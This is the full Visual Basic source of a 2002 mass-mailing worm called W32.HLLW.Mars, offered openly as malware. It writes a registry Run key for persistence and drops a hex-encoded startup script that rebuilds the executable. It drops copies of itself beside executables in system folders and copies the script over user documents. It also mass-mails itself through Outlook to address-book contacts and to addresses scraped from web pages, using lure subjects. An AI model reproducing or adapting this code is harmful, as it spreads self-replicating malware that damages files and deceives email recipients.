   ' Name : W32.HLLW.Mars
   ' Author : PetiK
   ' Language : Visual Basic
   ' Date : 20/06/2002

   Attribute VB_Name = "Module1"
   Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long
   Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
   Private Declare Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer
   Private Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
   Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
   Private Declare Function SetCurrentDirectory Lib "kernel32" Alias "SetCurrentDirectoryA" (ByVal lpPathName As String) As Long
   Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
   Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
   Public sysDir As String
   Public winDir As String
   Public orig As String
   Public cop As String
   Const CSIDL_STARTUP = &H7
   Private Type SHITEMID
       cb As Long
       abID As Byte
   End Type
   Private Type ITEMIDLIST
       mkid As SHITEMID
   End Type


   Sub Main()
   On Error Resume Next
   Dim sp, ext(1 To 9) As String, exts
   ext(1) = "index.htm"
   ext(2) = "index.html"
   ext(3) = "index.asp"
   ext(4) = "default.htm"
   ext(5) = "default.html"
   ext(6) = "default.asp"
   ext(7) = "main.htm"
   ext(8) = "main.html"
   ext(9) = "main.asp"


   Set ws = CreateObject("WScript.Shell")

   sysDir = Space(500)
   sysDir = Left(sysDir, GetSystemDirectory(sysDir, Len(sysDir)))
   winDir = Space(500)
   winDir = Left(sysDir, GetWindowsDirectory(winDir, Len(winDir)))
   orig = App.Path & "\" & App.EXEName & ".exe"

   Call Install
   Call VbsDrop
   Call InfectExe(sysDir)
   Call InfectExe(winDir)

   checkconnect:
   If InternetGetConnectedState(0&, 0&) = 0 Then GoTo checkconnect

   sp = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
   If Len(sp) <> 0 Then
   If Right(sp, 1) = "/" Then
   For i = 1 To 9
   Call srchmail(sp & ext(i))
   Next i
   ElseIf Right(sp, 4) <> ".htm" And Right(sp, 5) <> ".html" Then
   For i = 1 To 9
   Call srchmail(sp & "/" & ext(i))
   Next i
   Else
   End If
   End If

   End Sub

   Sub Install()
   On Error Resume Next
   Set ws = CreateObject("WScript.Shell")
   FileCopy orig, sysDir & "\DebugW32.exe"
   ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Debug", sysDir & "\DebugW32.exe"
   End Sub

   Private Function GetSpecialfolder(CSIDL As Long) As String
       Dim r As Long
       Dim IDL As ITEMIDLIST
       r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
       If r = NOERROR Then
           Path$ = Space$(512)
           r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
           GetSpecialfolder = Left$(Path, InStr(Path, Chr$(0)) - 1)
           Exit Function
       End If
       GetSpecialfolder = ""
   End Function

   Sub VbsDrop()
   On Error Resume Next
   Dim lngbufferlen
   Dim bbyte As Byte
   Dim pefile As String
   orig = App.Path & "\" & App.EXEName & ".exe"
   vbfle = GetSpecialfolder(CSIDL_STARTUP) & "\start.vbs"

   Open orig For Binary As #1
   DoEvents
   Do While Not EOF(1)
   DoEvents
   Get #1, , bbyte
   e = Hex(bbyte)
   If Len(e) = 1 Then e = "0" & Hex(bbyte)
   pefile = pefile & e
   Loop
   Close #1

   vbsf = "'Mars" & vbCrLf & _
           "On Error Resume Next" & vbCrLf & _
           "Set fso=CreateObject(""Scripting.FilesystemObject"")" & vbCrLf & _
           "Set ws=CreateObject(""WScript.Shell"")" & vbCrLf & vbCrLf & _
           "pevb=""" & pefile & """" & vbCrLf & _
           "read = dec(pevb)" & vbCrLf & _
           "Set r = fso.CreateTextFile(fso.GetSpecialFolder(1) & ""\DebugW32.exe"", 2)" & vbCrLf & _
           "r.Write read" & vbCrLf & _
           "r.Close" & vbCrLf & _
           "ws.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Debug"", fso.GetSpecialFolder(1) & ""\DebugW32.exe""" & vbCrLf
   vbsf2 = "For each fil in fso.GetFolder(ws.SpecialFolders(""MyDocuments"")).Files" & vbCrLf & _
           "ext = LCase(fso.GetExtensionName(fil.Path))" & vbCrLf & _
           "If ext <> ""vbs"" Then" & vbCrLf & _
           "fso.GetFile(WScript.ScriptFullName).Copy(fil.Path & "".vbs"")" & vbCrLf & _
           "End If" & vbCrLf & _
           "For Each sf In fso.GetFolder(ws.SpecialFolders(""MyDocuments"")).SubFolders" & vbCrLf & _
           "sprd(sf.Path)" & vbCrLf & _
           "Next" & vbCrLf & _
           "Next" & vbCrLf
   vbsf3 = "Sub sprd(dir)" & vbCrLf & _
           "On Error Resume Next" & vbCrLf & _
           "For Each fil In fso.GetFolder(dir).Files" & vbCrLf & _
           "ext = LCase(fso.GetExtensionName(fil.Path))" & vbCrLf & _
           "If ext <> ""vbs"" Then" & vbCrLf & _
           "fso.GetFile(WScript.ScriptFullName).Copy(fil.Path & "".vbs"")" & vbCrLf & _
           "End If" & vbCrLf & _
           "Next" & vbCrLf & _
           "For Each sf In fso.GetFolder(dir).SubFolders" & vbCrLf & _
           "sprd(sf.Path)" & vbCrLf & _
           "Next" & vbCrLf & _
           "End Sub" & vbCrLf & vbCrLf & _
           "Function dec(octe)" & vbCrLf & _
           "For hexad = 1 To Len(octe) Step 2" & vbCrLf & _
           "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))" & vbCrLf & _
           "Next" & vbCrLf & _
           "End Function" & vbCrLf
   vbsf4 = "Sub SprdOut()" & vbCrLf & _
           "Set outl=CreateObject(""Outlook.Application"")" & vbCrLf & _
           "For Each C In outl.GetNameSpace(""MAPI"").AddressLists" & vbCrLf & _
           "If C.AddressEntries.Count <> 0 Then" & vbCrLf & _
           "For dcnt=1 To C.AddressEntries.Count" & vbCrLf & _
           "Set courrier=outl.CreateItem(0)" & vbCrLf & _
           "courrier.To=C.AddressEntries(dcnt).Address" & vbCrLf & _
           "courrier.Subject=""Important EMail for "" & C.AddressEntries(dcnt).Name" & vbCrLf & _
           "courrier.Body=""Look at this attached file, it may be important.""" & vbCrLf & _
           "courrier.Attachments.Add(wScript.ScriptFullName)" & vbCrLf & _
           "courrier.DeleteafterSubmit=True" & vbCrLf & _
           "If courrier.To <> """" Then" & vbCrLf & _
           "courrier.Send" & vbCrLf & _
           "End If" & vbCrLf & _
           "Next" & vbCrLf & _
           "End If" & vbCrLf & _
           "Next" & vbCrLf
   Open vbfle For Output As #1
   Print #1, vbsf
   Print #1, vbsf2
   Print #1, vbsf3
   Print #1, vbsf4
   Close #1
   End Sub

   Sub InfectExe(dir As String)
   On Error Resume Next
   orig = App.Path & "\" & App.EXEName & ".exe"
   Set fso = CreateObject("Scripting.FileSystemObject")
   If fso.FolderExists(dir) Then
   x = 0
   For Each P In fso.GetFolder(dir).Files
   ext = LCase(fso.GetExtensionName(P.Name))
   nam = LCase(P.Name)

   If ext = "exe" Then
   If LCase(P.Name) <> "debugw32.exe" And (Right(LCase(P.Name), 9) <> "_vbpe.exe") Then
   If Not fso.FileExists(P.Name & "_vbpe.exe") Then
   FileCopy orig, dir & "\" & P.Name & "_vbpe.exe"
   x = x + 1
   End If
   End If
   End If
   If x = 5 Then Exit For
   Next
   End If
   End Sub

   Sub srchmail(site As String)
   On Error Resume Next
   Set fso = CreateObject("Scripting.FilesystemObject")
   Const INTERNET_OPEN_TYPE_DIRECT = 1
   Const INTERNET_OPEN_TYPE_PROXY = 3
   Const INTERNET_FLAG_RELOAD = &H80000000
   Dim hOpen As Long, hFile As Long, sBuffer As String, Ret As Long
   Dim mlto As String

   sBuffer = Space(25000)
   hOpen = InternetOpen(scUserAgent, INTERNET_OPEN_TYPE_DIRECT, vbNullString, vbNullString, 0)
   hFile = InternetOpenUrl(hOpen, site, vbNullString, ByVal 0&, INTERNET_FLAG_RELOAD, ByVal 0&)
   InternetReadFile hFile, sBuffer, 25000, Ret
   InternetCloseHandle hFile
   InternetCloseHandle hOpen

   For j = 1 To Len(sbufr)
   If Mid(sBuffer, j, 7) = "mailto:" Then
   mlto = ""
   cnt = 0
   Do While Mid(sBuffer, j + 7 + cnt, 1) <> """"
   mlto = mlto + Mid(sBuffer, j + 7 + cnt, 1)
   cnt = cnt + 1
   Loop

   Call SendMail(mlto)

   End If
   Next

   End Sub

   Sub SendMail(email As String)
   Dim out
   orig = App.Path & "\" & App.EXEName & ".exe"
   Set out = CreateObject("Outlook.Application")
   Set map = out.GetNameSpace("MAPI")
   map.Logon "profile", "password"
   Set mel = out.CreateItem(0)
   mel.To = email
   mel.Subject = "Congratulations for your site"
   mel.Body = "Congratulations for your site" & vbCrLf & _
           "This is a good tool to improve it." & vbCrLf & vbCrLf & _
           "Best Regards."
   mel.Attachments.Add orig, 1, 1, "WebMakeFullInstall.exe"
   mel.Send
   map.Logoff
   Set out = Nothing
   End Sub
